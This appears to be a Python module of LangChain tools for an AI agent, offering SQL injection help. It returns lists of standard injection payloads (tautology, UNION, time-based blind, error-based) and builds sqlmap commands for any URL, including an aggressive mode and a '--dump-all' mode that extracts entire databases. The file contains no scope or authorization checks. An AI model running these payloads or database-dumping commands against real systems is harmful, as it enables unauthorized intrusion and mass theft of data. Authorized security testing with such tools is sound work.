"""
SQL injection testing helper.
"""

import json
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from langchain.tools import tool

logger = logging.getLogger('zuck_agent')

SQLI_PAYLOADS = {
    "basic": ["' OR '1'='1", "' OR 1=1--", "\" OR 1=1--", "admin'--"],
    "union": ["' UNION SELECT NULL--", "' UNION SELECT 1,2,3--"],
    "blind": ["' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--"],
    "error": ["' AND 1=CONVERT(int,@@version)--"]
}

@tool
def sqli_payloads(payload_type: str = "basic") -> str:
    """Get SQL injection payloads. Types: basic, union, blind, error, all"""
    try:
        if payload_type == "all":
            return json.dumps({"payloads": SQLI_PAYLOADS}, indent=2)
        return json.dumps({"payloads": SQLI_PAYLOADS.get(payload_type, [])}, indent=2)
    except Exception as e:
        return f"Error: {e}"

@tool
def generate_sqlmap_command(url: str, mode: str = "basic") -> str:
    """Generate sqlmap command. Modes: basic, aggressive, dump"""
    cmds = {
        "basic": f"sqlmap -u \"{url}\" --batch --dbs",
        "aggressive": f"sqlmap -u \"{url}\" --batch --level=5 --risk=3",
        "dump": f"sqlmap -u \"{url}\" --batch --dump-all"
    }
    return json.dumps({"command": cmds.get(mode, cmds["basic"])}, indent=2)
